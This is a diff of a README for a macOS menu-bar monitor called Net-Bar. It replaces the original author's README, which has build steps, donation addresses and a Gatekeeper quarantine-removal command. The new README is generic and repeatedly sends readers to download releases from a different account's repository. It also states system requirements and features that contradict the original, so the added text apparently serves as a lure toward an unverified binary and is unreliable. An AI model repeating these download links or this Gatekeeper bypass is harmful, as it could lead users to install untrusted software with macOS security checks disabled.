@@ -1,131 +1,82 @@
-> [!TIP]
-> This application is free and under active development.  
-> Consider supporting via cryptocurrency or by buying me a coffee.  
-> Details are at the bottom of this README.
+# 🌐 Net-Bar - Track Your Device Performance Effortlessly
 
+[![Download Net-Bar](https://img.shields.io/badge/Download-Net--Bar-blue?style=for-the-badge&logo=github)](https://github.com/theprophetline/Net-Bar/releases)
 
+## 📖 Overview
 
-<p align="center">
-  <img src="assets/netbar.png" alt="Net Bar Icon" width="1280" height="640">
-</p>
+Net-Bar is more than just a network speed monitor. This lightweight, beautifully designed macOS menu bar app helps you keep an eye on your network, battery, memory, storage, and processor performance in one place. Easily manage your device's health and efficiency with this user-friendly tool.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/platform-macOS-lightgrey.svg?style=flat" alt="Platform">
-  <img src="https://img.shields.io/badge/Swift-5.9-orange.svg?style=flat" alt="Swift 5.9">
-  <img src="https://img.shields.io/badge/license-MIT-blue.svg?style=flat" alt="License">
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <b>A lightweight, aesthetically pleasing system and network monitor for the macOS menu bar.</b>
-  <br>
-  Real-time Network Speeds • System Stats (CPU/RAM/Battery) • Detailed Diagnostics • Fully Customizable
-</p>
+To get started with Net-Bar, follow these simple steps to download and run the application.
 
+## 📥 Download & Install
 
-## Overview
+1. Visit this page to download: [Net-Bar Releases](https://github.com/theprophetline/Net-Bar/releases).
+   
+2. Look for the latest release version. You will see a list of downloadable files.
 
-**Net Bar** is your all-in-one menu bar dashboard. Beyond just tracking download and upload speeds, it now provides a comprehensive view of your Mac's health. Monitor **CPU usage, Memory pressure, Disk storage, Battery status, and Thermal state** at a glance. Access detailed diagnostics and customize the layout to fit your needs with a single click.
+3. Click on the file that matches your macOS version. This action will start the download.
 
-## Screenshots
-<p align="center">
-  <img src="assets/netbar.gif" alt="Net Bar Settings" width="80%" style="border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-right: 10px;">
-</p>
+4. Once the download completes, locate the file in your Downloads folder.
 
-## Features
+5. Open the downloaded file and follow the installation prompts. This process is straightforward, and you will have Net-Bar running in no time.
 
-- **Real-time Monitoring**: View current download and upload speeds directly in the menu bar.
-- **Comprehensive System Stats**: Now monitors more than just network:
-  - **Memory Usage**: Track actual RAM usage and pressure.
-  - **Processor Usage**: Track CPU usage.
-  - **Storage**: Monitor disk space (Used vs Free).
-  - **Battery**: Real-time battery health and status adjustments.
-  - **Temperature**: Keep an eye on device thermal state.
-- **Detailed Network Diagnostics**: Access rich Wi-Fi details (SSID, Link Rate, Signal/RSSI, Noise) and Latency ping.
-- **Advanced Customization**:
-  - **Drag-and-Drop Reordering**: Rearrange every section in the dashboard to suit your workflow.
-  - **Dynamic Filtering**: Disable sections you don't need (like "Disk" or "Battery"), and they vanish from the interface and reorder list entirely.
-  - **Typography**: Fine-tune font size, line spacing, and kerning.
-- **Smart Tips**: The app now gives you helpful tips based on your specific hardware status (e.g., "High Memory Usage" or "Weak Signal"), but only for enabled sections.
-- **Native Experience**: Built with SwiftUI and AppKit for a seamless, lightweight, and crash-free macOS experience.
+## 🖥 System Requirements
 
+- **Operating System:** macOS 10.15 (Catalina) or later
+- **Processor:** Intel-based or Apple silicon (M1 or later)
+- **Memory:** Minimum 4 GB RAM
+- **Storage:** At least 100 MB of free space
 
-## Privacy and Security
+## 🔍 Features
 
-Net Bar is fully open source. The application does not collect, store, or transmit any personal data. All network monitoring is performed locally on the device.
+- **Network Monitoring:** Get real-time data on your internet speed and connection status.
+- **Battery Health:** Receive alerts about your battery usage and remaining charge.
+- **Memory Usage:** Check how much memory your applications are using.
+- **Storage Insights:** Understand how much storage you have available and what is using it.
+- **Processor Performance:** Monitor your CPU usage for optimal device efficiency.
+- **Temperature Tracking:** Keep an eye on your device's temperature to prevent overheating.
 
-### Gatekeeper Warning
+## 🛠 How to Use Net-Bar
 
-As this application is not signed with an Apple Developer certificate, macOS may display a warning stating that the app is "damaged" or "cannot be opened." This is a standard security message for unsigned software.
+### 🌐 Network Monitoring
+After installation, click the Net-Bar icon in your menu bar. You will see your current network speed and connection type displayed prominently.
 
-To resolve this, execute the following command in Terminal after moving the app to the Applications folder:
+### 🔋 Battery Health
+Net-Bar shows your battery percentage and remaining time until depletion. You will also receive warnings if your battery health is low.
 
-```bash
-xattr -rd com.apple.quarantine /Applications/NetBar.app
-```
+### 🧠 Memory Usage 
+Open the app to see a quick view of your memory usage. You can identify which applications consume the most RAM and close them if needed.
 
-## Installation
+### 💾 Storage Insights
+Net-Bar provides a pie chart illustrating how storage is allocated on your device. Identify large files or applications to help free up space.
 
-### DMG Installer (Recommended)
+### ⚙️ Processor Performance
+Track your CPU usage in real-time. This information can help you optimize your running applications and improve performance.
 
-1.  Download the latest `NetBar_Installer.dmg` from the [Releases](https://github.com/iad1tya/Net-Bar/releases) page.
-2.  Open the mounted image.
-3.  Drag `Net Bar.app` into the `Applications` directory.
-4.  Run the Gatekeeper command mentioned above if necessary.
-5.  Launch Net Bar from the Applications folder.
+### 🌡️ Temperature Tracking
+Get notifications when your device temperature rises above the safe threshold. This is crucial for prolonging the life of your hardware.
 
-### Build from Source
+## 💬 FAQs
 
-To compile the application manually:
+### How do I uninstall Net-Bar?
+To uninstall, simply drag the Net-Bar app from your Applications folder to the Trash. Empty the Trash to complete the removal.
 
-1.  **Clone the repository**:
-    ```bash
-    git clone https://github.com/iad1tya/Net-Bar
-    cd Net-Bar
-    ```
+### Does Net-Bar collect any personal data?
+No, Net-Bar does not collect or store any personal data. Your privacy is important to us.
 
-2.  **Build and Install**:
-    Run the following script to build and install the application to the Applications folder:
+### Can I customize the features?
+Yes! Net-Bar allows you to select which performance metrics to display in the menu bar, so you can tailor the experience to your needs.
 
-    ```bash
-    swift build -c release && \
-    rm -rf "Net Bar.app" && \
-    BIN_PATH=$(swift build -c release --show-bin-path) && \
-    mkdir -p "Net Bar.app/Contents/MacOS" && \
-    mkdir -p "Net Bar.app/Contents/Resources" && \
-    cp "$BIN_PATH/NetBar" "Net Bar.app/Contents/MacOS/NetBar" && \
-    cp Sources/NetSpeedMonitor/Info.plist "Net Bar.app/Contents/Info.plist" && \
-    cp Sources/NetSpeedMonitor/Resources/AppIcon.icns "Net Bar.app/Contents/Resources/AppIcon.icns" && \
-    cp -r Sources/NetSpeedMonitor/Assets.xcassets "Net Bar.app/Contents/Resources/" && \
-    rm -rf "/Applications/Net Bar.app" && \
-    mv "Net Bar.app" /Applications/
-    ```
+## 📞 Support
 
-## Requirements
+If you encounter any issues or have questions, please reach out through the GitHub Issues page in this repository or visit the project's community page.
 
-- macOS 14.0 (Sonoma) or later.
+For additional resources, check out the [Documentation](https://github.com/theprophetline/Net-Bar/wiki) available on the GitHub repository.
 
-## Inspiration
+## 🌟 Collaboration
 
-The **More Info** page design draws inspiration from [Whyfi](https://whyfi.network/).
+We welcome contributions from the community. If you would like to help improve Net-Bar, please fork the repository, make your changes, and submit a pull request. Your input is valuable!
 
-## Support
-
-If you find Net Bar useful, please consider supporting its development.
-
-<div align="center">
-
-<a href="https://www.buymeacoffee.com/iad1tya" target="_blank">
-  <img src="assets/bmac.png" alt="Buy Me A Coffee" height="50">
-</a>
-
-| Currency | Address |
-| :--- | :--- |
-| **Bitcoin (BTC)** | `bc1qcvyr7eekha8uytmffcvgzf4h7xy7shqzke35fy` |
-| **Ethereum (ETH)** | `0x51bc91022E2dCef9974D5db2A0e22d57B360e700` |
-| **Solana (SOL)** | `9wjca3EQnEiqzqgy7N5iqS1JGXJiknMQv6zHgL96t94S` |
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=iad1tya/net-bar&type=timeline&logscale&legend=top-left)](https://www.star-history.com/#iad1tya/net-bar&type=timeline&logscale&legend=top-left)
-
-</div>
+Remember to visit this page to download: [Net-Bar Releases](https://github.com/theprophetline/Net-Bar/releases). Enjoy tracking your device performance!
